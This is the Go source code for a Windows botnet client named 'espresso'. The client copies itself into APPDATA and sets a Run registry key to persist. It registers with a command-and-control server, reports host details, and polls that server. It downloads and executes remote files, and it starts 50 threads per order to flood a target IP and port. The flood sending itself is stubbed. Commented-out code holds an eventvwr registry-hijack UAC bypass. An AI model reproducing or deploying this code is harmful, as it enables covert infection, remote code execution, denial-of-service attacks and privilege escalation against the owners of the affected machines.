package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"golang.org/x/sys/windows/registry"
)

type Creds struct {
	ID    string `json:"identifier"`
	Token string `json:"token"`
}

type Session struct {
	Key string `json:"key"`
}

type Load struct {
	Url string `json:"file"`
}

type BootInstructions struct {
	ID   string `json:"identifier"`
	Ip   string `json:"ip"`
	Port string `json:"port"`
	End  string `json:"endTime"`
}

func Pad(buf []byte, size int) ([]byte, error) {
	bufLen := len(buf)
	padLen := size - bufLen%size
	padded := make([]byte, bufLen+padLen)
	copy(padded, buf)
	for i := 0; i < padLen; i++ {
		padded[bufLen+i] = byte(padLen)
	}
	return padded, nil
}

func Unpad(padded []byte, size int) ([]byte, error) {
	if len(padded)%size != 0 {
		return nil, errors.New("pkcs7: Padded value wasn't in correct size.")
	}

	bufLen := len(padded) - int(padded[len(padded)-1])
	buf := make([]byte, bufLen)
	copy(buf, padded[:bufLen])
	return buf, nil
}

func Encrypt(unencrypted string, cipher_key string) (string, error) {
	key := []byte(cipher_key)
	plainText := []byte(unencrypted)
	plainText, err := Pad(plainText, aes.BlockSize)
	if err != nil {
		return "", fmt.Errorf(`plainText: "%s" has error`, plainText)
	}
	if len(plainText)%aes.BlockSize != 0 {
		err := fmt.Errorf(`plainText: "%s" has the wrong block size`, plainText)
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	cipherText := make([]byte, aes.BlockSize+len(plainText))
	iv := cipherText[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return "", err
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(cipherText[aes.BlockSize:], plainText)

	return fmt.Sprintf("%x", cipherText), nil
}

func Decrypt(encrypted string, cipher_key string) (string, error) {
	key := []byte(cipher_key)
	cipherText, _ := hex.DecodeString(encrypted)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	if len(cipherText) < aes.BlockSize {
		return "", errors.New("cipherText too short")
	}
	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]
	if len(cipherText)%aes.BlockSize != 0 {
		return "", errors.New("cipherText is not a multiple of the block size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(cipherText, cipherText)

	cipherText, _ = Unpad(cipherText, aes.BlockSize)
	return fmt.Sprintf("%s", cipherText), nil
}

func checkConnection(apiURL string) bool {
	var result bool = false

	client := &http.Client{}
	req, _ := http.NewRequest("GET", apiURL, nil)

	req.Header.Set("User-Agent", "espresso")
	resp, err := client.Do(req)

	if err == nil {
		if resp.StatusCode == 200 {
			result = true
		}
	}

	return result
}

func checkAccount(apiURL string, id string, token string) bool {
	var result bool = false
	var checkAccountURL string = apiURL + "/client/check/" + id + "/" + token

	client := &http.Client{}
	req, _ := http.NewRequest("GET", checkAccountURL, nil)

	req.Header.Set("User-Agent", "espresso")
	resp, _ := client.Do(req)

	if resp.StatusCode == 200 {
		result = true
	}

	return result
}

func registerAccount(apiURL string) []string {
	var registerAccountURL string = apiURL + "/client/register"
	var result []string

	requestBody, _ := json.Marshal(map[string]string{
		"": "",
	})

	client := &http.Client{}
	req, _ := http.NewRequest("POST", registerAccountURL, bytes.NewReader(requestBody))

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "espresso")
	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON Creds
			responseBytes, _ := ioutil.ReadAll(resp.Body)
			json.Unmarshal(responseBytes, &decodedJSON)
			result = append(result, decodedJSON.ID)
			result = append(result, decodedJSON.Token)
		}
	}

	return result
}

func checkFile(filePath string) bool {
	var result bool

	if _, err := os.Stat(filePath); err == nil {
		if err != nil {
			result = false
		} else {
			result = true
		}
	}

	return result
}

func writeToConfigFile(filePath string, fileKey string, id string, token string) {
	f, _ := os.Create(filePath)

	defer f.Close()

	var str = id + ":" + token
	encryptedStr, _ := Encrypt(str, fileKey)
	f.WriteString(encryptedStr)
}

func writeToBootFile(filePath string, fileKey string, id string) {
	f, _ := os.Create(filePath)

	defer f.Close()

	encryptedStr, _ := Encrypt(id, fileKey)
	f.WriteString(encryptedStr)
}

func readFromConfigFile(filePath string, fileKey string) []string {
	var result []string
	data, _ := ioutil.ReadFile(filePath)
	unencrypted, err := Decrypt(string(data), fileKey)

	if err == nil {
		var fileContents string = string(unencrypted)
		result = strings.Split(fileContents, ":")
	} else {
		result = append(result, "invalid")
		result = append(result, "invalid")
	}

	return result
}

func readFromBootFile(filePath string, fileKey string) string {
	var result string
	data, _ := ioutil.ReadFile(filePath)

	unencrypted, err := Decrypt(string(data), fileKey)

	if err == nil {
		result = unencrypted
	} else {
		result = "invalid"
	}

	return result
}

func updateDetails(apiURL string, sessionKey string, id string, token string) {
	var updateURL string = apiURL + "/update/details/" + id + "/" + token

	hostname, _ := os.Hostname()
	var platform string = runtime.GOOS
	var arch string = runtime.GOARCH

	encryptedHostname, _ := Encrypt(hostname, sessionKey)
	encryptedPlatform, _ := Encrypt(platform, sessionKey)
	encryptedArch, _ := Encrypt(arch, sessionKey)

	requestBody, _ := json.Marshal(map[string]string{
		"hostname": encryptedHostname,
		"platform": encryptedPlatform,
		"arch":     encryptedArch,
	})

	client := &http.Client{}
	req, _ := http.NewRequest("POST", updateURL, bytes.NewReader(requestBody))

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "espresso")
	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()
	}
}

func getSessionKey(apiURL string, id string, token string) string {
	var result string
	var sessionURL = apiURL + "/session/key/" + id + "/" + token

	client := &http.Client{}
	req, _ := http.NewRequest("GET", sessionURL, nil)

	req.Header.Set("User-Agent", "espresso")
	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON Session
			responseBytes, _ := ioutil.ReadAll(resp.Body)

			json.Unmarshal(responseBytes, &decodedJSON)
			result = string(decodedJSON.Key)
		}
	}

	return result
}

func checkLoad(apiURL string, id string, token string) bool {
	var result bool
	var loadURL string = apiURL + "/load/" + id + "/" + token

	client := &http.Client{}
	req, _ := http.NewRequest("GET", loadURL, nil)

	req.Header.Set("User-Agent", "espresso")
	resp, err := client.Do(req)

	if err == nil {
		if resp.StatusCode == 200 {
			result = true
		} else {
			result = false
		}
	}

	return result
}

func getLoadURL(apiURL string, sessionKey string, id string, token string) string {
	var result string
	var loadURL string = apiURL + "/load/" + id + "/" + token

	client := &http.Client{}
	req, _ := http.NewRequest("GET", loadURL, nil)

	req.Header.Set("User-Agent", "espresso")
	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON Load
			responseBytes, _ := ioutil.ReadAll(resp.Body)

			json.Unmarshal(responseBytes, &decodedJSON)

			unencryptedUrl, _ := Decrypt(decodedJSON.Url, sessionKey)
			result = unencryptedUrl
		}
	}

	return result
}

// File downloaded but won't run
// To be fixed

func loadFile(apiURL string, sessionKey string, id string, token string, fileName string, fileURL string) {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", fileURL, nil)

	req.Header.Set("User-Agent", "espresso")
	resp, err := client.Do(req)

	if err == nil {
		fmt.Println("Downloaded " + fileURL)
		output, _ := os.Create(fileName)
		defer output.Close()
		defer resp.Body.Close()
		io.Copy(output, resp.Body)

		Exec := exec.Command(fileName)
		err = Exec.Start()

		if err != nil {
			fmt.Println(err)
		}

		requestBody, _ := json.Marshal(map[string]string{
			"": "",
		})

		req, _ := http.NewRequest("POST", apiURL+"/loadcheck/"+id+"/"+token, bytes.NewBuffer(requestBody))

		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "espresso")

		client.Do(req)

		os.Remove(fileName)

	}

}

func loadRun(apiURL string, sessionKey string, id string, token string, fileName string) {
	var loadActive bool = checkLoad(apiURL, id, token)

	if loadActive {
		var loadFileUrl string = getLoadURL(apiURL, sessionKey, id, token)
		loadFile(apiURL, sessionKey, id, token, fileName, loadFileUrl)
	}
}

func checkBoot(apiURL string, id string, token string) bool {
	var result bool
	var bootURL string = apiURL + "/boot/" + id + "/" + token

	client := &http.Client{}
	req, _ := http.NewRequest("GET", bootURL, nil)

	req.Header.Set("User-Agent", "espresso")
	resp, err := client.Do(req)

	if err == nil {
		if resp.StatusCode == 200 {
			result = true
		} else {
			result = false
		}
	}

	return result
}

func getBootInstructions(apiURL string, sessionKey string, id string, token string) []string {
	var result []string
	var bootURL string = apiURL + "/boot/" + id + "/" + token

	client := &http.Client{}
	req, _ := http.NewRequest("GET", bootURL, nil)

	req.Header.Set("User-Agent", "espresso")
	resp, err := client.Do(req)

	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			var decodedJSON BootInstructions
			responseBytes, _ := ioutil.ReadAll(resp.Body)

			json.Unmarshal(responseBytes, &decodedJSON)

			unencryptedId, _ := Decrypt(decodedJSON.ID, sessionKey)
			unencryptedIp, _ := Decrypt(decodedJSON.Ip, sessionKey)
			unencryptedPort, _ := Decrypt(decodedJSON.Port, sessionKey)
			unencryptedEnd, _ := Decrypt(decodedJSON.End, sessionKey)

			result = append(result, unencryptedId)
			result = append(result, unencryptedIp)
			result = append(result, unencryptedPort)
			result = append(result, unencryptedEnd)
		}
	}

	return result
}

func bootRun(apiURL string, sessionKey string, fileKey string, id string, token string, bootFilePath string) {
	var bootActive bool = checkBoot(apiURL, id, token)

	if bootActive {
		var bootInstructions []string = getBootInstructions(apiURL, sessionKey, id, token)

		var savedBootID string = readFromBootFile(bootFilePath, fileKey)

		if savedBootID != bootInstructions[1] {
			writeToBootFile(bootFilePath, fileKey, bootInstructions[0])

			str := bootInstructions[3]
			t, _ := time.Parse(time.RFC3339, str)

			var endTime string = t.Format("2006-01-02 15:04:05.000000000 +0000 UTC")
			endTimeObject, _ := time.Parse("2006-01-02 15:04:05.000000000 +0000 UTC", endTime)

			for i := 0; i < 50; i++ {
				go bootRoutine(id, token, endTimeObject, bootInstructions)
			}

		} else {
			fmt.Println("Already booting")
		}

	} else {
		fmt.Println("No boot")
	}
}

func bootRoutine(id string, token string, endTime time.Time, bootInstructions []string) {
	for {
		var currentTime string = time.Now().UTC().Format("2006-01-02 15:04:05.000000000 +0000 UTC")
		currentTimeObject, _ := time.Parse("2006-01-02 15:04:05.000000000 +0000 UTC", currentTime)

		if currentTimeObject.After(endTime) {
			fmt.Println("end")
			break
		}

		flood(bootInstructions[1], bootInstructions[2])
	}
}

// To be used in the future

// func randomString(strlen int, icint bool) string { //Generates a random string
// 	if icint {
// 		random.Seed(time.Now().UTC().UnixNano())
// 		const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
// 		result := make([]byte, strlen)
// 		for i := 0; i < strlen; i++ {
// 			result[i] = chars[random.Intn(len(chars))]
// 		}
// 		return string(result)
// 	}
// 	random.Seed(time.Now().UTC().UnixNano())
// 	const chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
// 	result := make([]byte, strlen)
// 	for i := 0; i < strlen; i++ {
// 		result[i] = chars[random.Intn(len(chars))]
// 	}
// 	return string(result)
// }

func flood(target string, port string) {
	fmt.Println("Sent TCP packet at " + target + ":" + port)

	// connection.Write panics with nil pointer derefrence
	// to be fixed

	// connection, _ := net.Dial("tcp", target+":"+port)
	// random.Seed(time.Now().UTC().UnixNano())
	// _, err := connection.Write([]byte(randomString(100, false)))

	// if err != nil {
	// 	fmt.Println(0)
	// }

	// connection.Close()

}

// To be used in the future

// func amAdmin() bool {
// 	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
// 	return err == nil
// }

// func uacBypass(file string) bool {
// 	Binary, _ := os.Create("temp.exe")
// 	DecodedBinary, _ := base64.StdEncoding.DecodeString(file)
// 	Binary.WriteString(string(DecodedBinary))
// 	Binary.Close()
// 	cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKLM\\SOFTWARE\\Classes\\mscfile\\shell\\open\\command", "/d", "temp.exe")
// 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
// 	_, err := cmd.Output()
// 	if err != nil {
// 		return false
// 	}
// 	c := exec.Command("cmd", "/C", "eventvwr.exe")
// 	c.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
// 	if err := c.Run(); err != nil {
// 		return false
// 	}
// 	cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKLM\\SOFTWARE\\Classes\\mscfile\\shell\\open\\command", "/f")
// 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
// 	_, err = cmd.Output()

// 	return err == nil
// }

func addRegKey(regLocation registry.Key, regPath string, key string, value string) bool {
	k, err := registry.OpenKey(regLocation, regPath, registry.QUERY_VALUE|registry.SET_VALUE)

	if err != nil {
		log.Fatal(err)
		return false
	}

	if err := k.SetStringValue(key, value); err != nil {
		log.Fatal(err)
		return false
	}

	if err := k.Close(); err != nil {
		log.Fatal(err)
		return true
	}

	return true
}

func persistency() {
	goApp, _ := os.Executable()
	src, _ := os.Open(goApp)

	defer src.Close()

	var fileToDestination string = os.Getenv("APPDATA") + "\\espresso.exe"

	dest, _ := os.Create(fileToDestination)

	defer dest.Close()

	io.Copy(dest, src)

	var userLevelKey string = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	addRegKey(registry.CURRENT_USER, userLevelKey, "espresso", fileToDestination)
}

func main() {
	var appDataFolder string = os.Getenv("APPDATA")

	var fileKey string = "skdnfhtjgrwnfghserfhiotfdsengdrm"    // 32 char hardcoded key for config and boot file encryption
	var bootFilePath string = appDataFolder + "\\boot.txt"     // This file keeps an id that tracks what boot instruction the client is executing
	var configPath string = appDataFolder + "\\config.txt"     // This is where the client's credidentials are stored
	var tempLoadFileName string = appDataFolder + "\\temp.exe" // This is the temporary file use for downloading and running executables
	var apiURL string = "http://127.0.0.1:8080"                // The server's location

	var apiConnection bool = checkConnection(apiURL)

	persistency()

	if apiConnection {
		var configFileExists bool = checkFile(configPath)

		if configFileExists {
			var credidentials []string = readFromConfigFile(configPath, fileKey)
			var credsValidated = checkAccount(apiURL, credidentials[0], credidentials[1])

			if credsValidated {

				var sessionKey string = getSessionKey(apiURL, credidentials[0], credidentials[1])

				updateDetails(apiURL, sessionKey, credidentials[0], credidentials[1])

				for range time.NewTicker(5 * time.Second).C {
					sessionKey = getSessionKey(apiURL, credidentials[0], credidentials[1])
					bootRun(apiURL, sessionKey, fileKey, credidentials[0], credidentials[1], bootFilePath)
					loadRun(apiURL, sessionKey, credidentials[0], credidentials[1], tempLoadFileName)
				}

			} else {
				var newCredidentials []string = registerAccount(apiURL)
				writeToConfigFile(configPath, fileKey, newCredidentials[0], newCredidentials[1])
				main()
			}

		} else {
			var newCredidentials []string = registerAccount(apiURL)
			writeToConfigFile(configPath, fileKey, newCredidentials[0], newCredidentials[1])
			main()
		}

	} else {
		time.Sleep(30 * time.Second)
		main()
	}
}
